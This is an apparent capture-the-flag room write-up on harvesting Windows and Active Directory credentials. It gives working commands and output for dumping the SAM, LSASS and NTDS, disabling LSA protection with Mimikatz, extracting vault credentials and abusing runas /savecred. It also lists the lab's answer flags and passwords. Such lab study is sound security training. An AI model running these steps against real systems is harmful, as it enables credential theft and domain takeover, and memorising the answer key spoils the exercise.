Task1 - Introduction
-------------------------------------

The these modules we will check out how to obtain credentials to perform lateral movement and access resources in the AD environment. 

We will be gathering:
* Login Information
* Account Names
* Passwords

Some of the ways we will explore:
* Clear Text Files
* Obsfucated Files (base64 encoded etc)
* Registry
* Memory Dumps
* Network sniffing

__Questions__

I have completed room prerequisites and am ready to learn about Credentials Harvesting!
Answer: _None needed_


Task2 - Credential Harvesting
-----------------------------------------------

As the term of the title implies, this refers to gathering information and credentials we need to increase our access on the systems. Looking for stored credentials.

Credentials can be found in a variety of different forms, such as:

-   Accounts details (usernames and passwords)
-   Hashes that include NTLM hashes, etc.
-   Authentication Tickets: Tickets Granting Ticket (TGT), Ticket Granting Server (TGS)  
-   Any information that helps login into a system (private keys, etc.)


There are generally 2 types of credential harvesting. Internal and External. If we want to go external we can look in Social Media sites, Git repos, but also phishing campaigns. 

Here we will focus on the Internal method, where we already have a set of initial credentials to gain an intial foot-hold in the system.

__Questions__

I am ready to get started!
Answer: _None needed_

Task3 - Credential Access
------------------------------------------

__Credential Access__

This is where we can find credentials in compromised systems. It is always preferable to find credentials rather than resorting to things like CVEs or exploits because the later can break the systems and/or raise alarms.

Credentials can be in the following locations or others:
-   Clear-text files
-  Obfuscated or encrypted files
-   Database files
-   Memory
-   Password managers
-   Enterprise Vaults
-   Active Directory
-   Network Sniffing

__Clear-text Files__

Clear-text files might contain sensative information like passwords, private keys etc. The MITRE ATT&CK framework defines it as **Unsecured Credentials: Credentials In Files** ([T1552.001](https://attack.mitre.org/techniques/T1552/001/)).

For example, suppose we wanted to look through PowerShell commands to see if someone left a $Password in there from a typical password change. We could look in:
`C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

If you wanted to search the Windows registery for Password then you could use this:
```shell-session
c:\Users\user> reg query HKLM /f password /t REG_SZ /s 

#OR 

C:\Users\user> reg query HKCU /f password /t REG_SZ /s
```


__Database Files__

Applications use Database files to read and write settings and yes credentials too. Many times Databases in Windows systems are stored locally. 

__Password Managers__

A password manager is a 3rd party tool to save passwords and make it easier for users to remember only a single login password to basically copy/paste or click-to-place their password into an app or site. 

Some examples:
* Built-in password managers (Windows)
* Third-Party: KeePass, 1Password, LastPass

Misconfigurations or security flaws and bugs can leave these open to attack.

__Memory Dump__

The operating systems' memory can contain a treasure trove of information like un-encrypted data/passwords. Since this data gets loaded when the program is executed.

Some examples of data in memory:
* Clear-text passwords
* Cached passwords
* AD tickets

__Active Directory__

AD stores a lot of information on users, groups and machines etc. This is typically a primary focus by advarsaries and red-teams.

These are some common mis-configs which can lead to information leaks:

-   **Users' description**: Administrators set a password in the description for new employees and leave it there, which makes the account vulnerable to unauthorized access. 
-   **Group Policy SYSVOL**: Leaked encryption keys let attackers access administrator accounts. Check Task 8 for more information about the vulnerable version of SYSVOL.
-   **NTDS:** Contains AD users' credentials, making it a target for attackers.
-   **AD Attacks:** Misconfiguration makes AD vulnerable to various attacks, which we will discuss in Task 9.

__Network Sniffing__

If we can gain sufficient access to target network for sniffing, then we can do things like man-in-the-middle attacks. This can reveal passwords, or let us create rogue or spoofed resources to steal credentials and NTLM hashes.

So we can search for the first flag using the reg.exe located in C:\Windows\system32 directory:

```shell-session
c:\Users\user> reg query HKLM /f flag /t REG_SZ /s
```

Then we can see the flag:
![[creds-harvest-1.png]]

For the next question we can use powershell to enumerate AD:
```shell-session
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
```

Then we can see the THM Victim with SamAccountName 'victim':
![[cred-harvest2.png]]

__Questions__

Use the methods shown in this task to search through the Windows registry for an entry called "flag" which contains a password. What is the password?
Answer: _tyh4ckm3_

Enumerate the AD environment we provided. What is the password of the victim user found in the description section?
Answer: _Passw0rd!@#_

Task4 - Local Windows Credentials
------------------------------------------------------

Generally speaking there are 2 types of Windows credentials: domain and local.

__Keystrokes__

Using a keylogger such as in Metasploit is another valuable way to get passwords. If we know a target user is logged in we can setup a keylogger and wait for them to login.

__Security Account Manager (SAM)__

The SAM is the local Microsoft Windows database that stores users and passwords. This DB is encrypted and also it may not be accessed while Windows is running. That said, there are ways to attack it.

The SAM is here:
`C:\Windows\System32\config\sam`

First we can see if we can read it or copy it:
`type C:\Windows\System32\config\sam`
and
`copy C:\Windows\System32\config\sam C:\Users\Administrator\Desktop\

![[cred-harvest3.png]]

__Metasploit's HashDump__

One of the easy ways to dump the hashes is using the built-in hashdump feature in Metasploit. This tool uses in-memory code injection to the LSASS.exe process to dump hashes.

```shell-session
meterpreter > getuid
Server username: THM\Administrator
meterpreter > hashdump
[...]
hash
```

__Volume Shadow Copy Service__

In this method we use the Microsoft Volume Shadow copy service while in operation. Here are the steps:

1.  Run the standard cmd.exe prompt with administrator privileges.
2.  Execute the wmic command to create a copy shadow of C: drive
3.  Verify the creation from step 2 is available.
4.  Copy the SAM database from the volume we created in step 2

The process looks like this:

![[cred-harvest4.png]]

Once that has completed, we can use vssadmin, Volume Shadow Copy Service Administrator CLI tool to list and confirm we have a shadow copy of the C: drive volume:

![[cred-harvest5.png]]

This shows we successfully created a Shadow Volume on the path:
`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`

This file is encrypted with either RC4 or AES encryption.  We need the key which is stored in:
`c:\Windows\System32\Config\system`

Now let's copy both the sam and system files to our desktop:
```shell-session
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
        1 file(s) copied.

C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.
```

10.10.123.235

Now get the files over to our Attackbox:
![[cred-harvest6.png]]

__Registery Hives__

The Windows registery is another possible way to dump the SAM database content. It does store some of the data from the SAM to be used for Windows Services. We can use the Reg.exe tool for saving. As before we need 2 files:

```shell-session
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>
```

Let's copy those over to the Attackbox too.
![[cred-harvest7.png]]

Now let's use Impackets tools: secretsdump.py to extract credentials:
```bash
root@ip-10-10-123-235:~# python3.9 /opt/impacket/examples/secretsdump.py -sam /var/tmp/sam-reg -system /var/tmp/system-reg LOCAL
Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)

[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 

```

If we compare these results to the NTLM hashes we get from Metasploit the results are different. The reason for this is that the other accounts belong to Active Directory. Of course none of those are stored in the local system. To decrypt those we need to dump the SECURITY file from the Windows file which contains the required files to decrypt AD accounts.

Now that we have NTLM credentials we can use hashcat on them or just use them for impersonation.


__Questions__

Follow the technique discussed in this task to dump the content of the SAM database file. What is the NTLM hash for the Administrator account?
Answer: _98d3a787a80d08385cea7fb4aa2a4261_

Task5 - Local Security Subsystem Service (LSASS)
-------------------------------------------------------------------

__What is the LSASS__

This process handles the local security policies and enforces them on the system. This is what handles local users passwords, hashes, tickets etc. Windows keeps the credentials in LSASS so the user doesn't have to enter the credentials each time.

This is a great target for collecting credentials. Please see MITRE ATT&CK framework as "[OS Credential Dumping: LSASS Memory (T1003)](https://attack.mitre.org/techniques/T1003/001/)" for more info.

__Graphical User Interface__

You can use the Task Manager to  Create dump file of any process running in memory. Just right-click it and select "Create Dump File".

Once it is finished a pop-up will alert you to where it was saved. Now just copy it over to the Attackbox to extract the NTLM Hashes.

![[cred-harvest8.png]]

__SysInternals Suite__

If we don't have a GUI, we can also use the ProcDump utility which is part of the SysInternals Suite.

Here is how you can use that util to dump lsass:
```shell-session
c:\>c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
```

In our case, as with the GUI method using TaskMgr, we will continue getting errors since we have protection in place guarding LSASS.

__Mimikatz__

This is a widely known tool for exploiting Microsoft by dumping hashes, passwords, and Tickets from memory. It also requires Administrator access.

Run Mimikatz:
```shell-session
C:\Tools\Mimikatz> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )

 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # 
```

We need to first enable debug mode.

```shell-session
mimikatz # privilege::debug
Privilege '20' OK
```

Then we can use `sekurlsa::logonpasswords`. This will fail again since LSASS is protected, so rather than go through more examples yet let's work on fixing that LSASS problem.

__Protected LSASS__

In 2012 Microsoft implemented LSA protections to keep people from extracting passwords.

To enable the protection, we can enable the registry RunAsPPL DWORD value in `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` and set it to `1`.

Since we are already in mimikatz, we can use a built-in feature for disabling this protection. Mimikatz uses a mimidrv.sys driver that works on the kernel level to disable the LSA protection. We need to first import it using `!+` like this:

```shell-session
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
```

NOTE: If you see a `isFileExist` error then it cannot find the mimidrv.sys file. You will need to exit, and the navigate to the directory where mimikatz is, which is `C:\Tools\Mimikatz` on this setup and run it again.

After the driver is loaded we can disable the LSA protection like this:
```shell-session
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 528 -> 00/00 [0-0-0]
```

![[cred-harvest10.png]]
Then you can just run the `sekurlsa::logonpasswords` command again to dump the passwords.

![[cred-harvest11.png]]

__Questions__

Is the LSA protection enabled? (Y|N)
Answer: _Y_

If yes, try removing the protection and dumping the memory using Mimikatz. Once you have done, hit Complete.
Answer: _None Needed_


Task6 - Windows Credential Manager
----------------------------------------------------------------

__What is Credentials Manager?__

This is a Windows feature that stores logon-sensative information for applications, websites and networks. 

There are 4 categories:

-   Web credentials contain authentication details stored in Internet browsers or other applications.
-   Windows credentials contain Windows authentication details, such as NTLM or Kerberos.
-   Generic credentials contain basic authentication details, such as clear-text usernames and passwords.
-   Certificate-based credentials: Athunticated details based on certifications.


__Accessing Credential Manager__

You can access this in the GUI by going to `Control Panael -> User Accounts -> Credential Manager` or from the CLI.  

![[cred-harvest12.png]]

If we use the CLI, we will be dealing with the `vaultcmd` utility.

```shell-session
C:\Users\Administrator>vaultcmd /list
Currently loaded vaults:
        Vault: Web Credentials
        Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

        Vault: Windows Credentials
        Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
        Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault
```

By default, Windows has 2 vaults. One for Web and the other for Windows machine credentials. We can see that from our screenshot above.

Some additional commands we can use to dig into that:
```shell-session
vaultcmd /listproperties:"Web Credentials"
vaultcmd /listcreds:"Web Credentials"
```

![[cred-harvest13.png]]

Since VaultCmd is not able to show our password, we can use other tools such as the `Get-WebCredentials.ps1` powershell cmdlet.

Be sure to use the Powershell with bypass policy.
```shell-script
C:\Users\Administrator>powershell -ex bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> Import-Module C:\Tools\Get-WebCredentials.ps1
PS C:\Users\Administrator> Get-WebCredentials

UserName  Resource             Password     Properties
--------  --------             --------     ----------
THMUser internal-app.thm.red Password! {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]}
```

![[cred-harvest14.png]]
Note the password: E4syPassw0rd

__RunAs__

A good alternate to take adavantage of stored credentials is the RunAs command. This is a built-in Windows tool that allows us to run different applications as another user. The `/savecred` command argument allows us to save the credential of the user in Windows Credential Manager, so if we run RunAs again it won't prompt us for the password.

Another way we can list stored creds is using `cmdkey`, which allows us to display, create, delete stored Windows credentials. 

```shell-session
C:\Users\thm>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=thm\thm-local
    Type: Domain Password
    User: thm\thm-local
```

If we try it we can find that we see a domain password stored as thm.red\thm-local which we can use with RunAs.

`runas /savecred /user:THM.red\thm-local cmd.exe` which pops up another cmd prompt as shown:

![[cred-harvest15.png]]

Now if we navigate to `C:\Users\thm-local\Saved Games` we can see our flag.txt file:

![[cred-harvest16.png]]

To get the 2nd flag, we can run mimikatz as before:

![[cred-harvest17.png]]



__Questions__

Apply the technique for extracting clear-text passwords from Windows Credential Manager. What is the password of the THMuser for internal-app.thm.red?
Answer: _E4syPassw0rd_

Use Mimikatz to memory dump the credentials for the 10.10.237.226 SMB share which is stored in the Windows Credential vault. What is the password?
Answer: _jfxKruLkkxoPjwe3_

Run cmd.exe under thm-local user via runas and read the flag in "c:\Users\thm-local\Saved Games\flag.txt". What is the flag?
Answer: _THM{RunASS4veCr3ds}_


Task7 - Domain Controller
-----------------------------------------------

__NTDS Domain Controller__

New Technology Directory Services (NTDS) is a database that contains all Active Directory data, including objects, attributes, credentials, etc. The ntds.dts file has 3 tables:

-   Schema table: it contains types of objects and their relationships.
-   Link table: it contains the object's attributes and their values.
-   Data type: It contains users and groups.

NTDS is located in `C:\Windows\NTDS` by default. It is encrypted. Also accessing the NTDS.dit file is not allowed. There are some ways around this which we will cover in this task.

Some ways to get a copy:
* ntdsutil
* Diskshadow tool

Once we have a copy we can attempt to dump the contents, but that will require a Boot Key to decrypt the LSA credentials which is stored in the SECURITY file system. So, we need to dump that as well.

__NTDSUtil__

This is a Windows utlity to manage AD configurations. It is used in situations such as:

-   Restore deleted objects in Active Directory.
-   Perform maintenance for the AD database.
-   Active Directory snapshot management.
-   Set Directory Services Restore Mode (DSRM) administrator passwords.

__Local Dumping (No Credentials)__

We can use this way if we don't have credentials available but do have admin access to the domain controller. So we will use Windows utilities to dump the NTDS file and crack them offline.

To dump the content of the NTDS file we need:

-   C:\Windows\NTDS\ntds.dit
-   C:\Windows\System32\config\SYSTEM
-   C:\Windows\System32\config\SECURITY

Here is a Powershell cmdlet you can use to dump the NTDS file to `C:\Temp`

```shell-session
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

Now, if we check the `c:\temp` directory, we see two folders: Active Directory and registry, which contain the three files we need. Transfer them to the AttackBox and run the secretsdump.py script to extract the hashes from the dumped memory file.

```shell-session
$ python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
```
